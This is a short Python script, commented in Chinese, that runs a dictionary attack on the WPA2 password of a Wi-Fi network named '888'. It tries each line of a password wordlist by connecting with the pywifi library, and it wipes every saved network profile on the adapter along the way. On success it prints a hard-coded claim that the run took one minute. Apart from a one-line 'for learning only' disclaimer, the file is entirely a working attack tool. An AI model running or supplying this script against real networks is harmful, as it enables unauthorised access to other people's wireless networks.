#coding:utf-8
import pywifi
import sys
import time
from pywifi import const

def test_wifi_connect(passwordstr):
    wifi=pywifi.PyWiFi()#初始化
    ifaces=wifi.interfaces()[0]#创建取出第一个无限网卡
    #print(ifaces.name())#输出无限网卡名
    ifaces.disconnect()#断开无限网卡连接
    time.sleep(1)#断开以后缓冲2秒

    profile=pywifi.Profile()#配置文件
    profile.ssid="888"#wifi名称
    profile.auth=const.AUTH_ALG_OPEN#需要密码连接
    profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密
    profile.cipher=const.CIPHER_TYPE_CCMP#机密单元
    profile.key=passwordstr #wifi密钥

    ifaces.remove_all_network_profiles()#删除其他所有配置文件
    tmp_profile=ifaces.add_network_profile(profile)#加载配置文件

    ifaces.connect(tmp_profile)#连接
    time.sleep(1)#10秒内能否连接上
    isok = True
    if ifaces.status()==const.IFACE_CONNECTED:
        # print("连接成功")
        return True
    else:
        # print("连接失败")
        ifaces.disconnect()#断开连接
        # time.sleep(1)
        return False

fpath=r"wifi密码字典2.txt"
files=open(fpath,'r')
while True:#一行一行的输出
    fd=files.readline()
    if not fd:
        break
    fd = fd[:-1]  # 去掉换行符
    if test_wifi_connect(fd):
      print(fd,"密码正确")
      print("正在连接。。。")
      print("连接成功！总耗时 1 分钟。")
      print("仅供学习交流之用，不可滥用、乱用！！！")
      break
    else:
        print(fd,"密码错误")

files.close()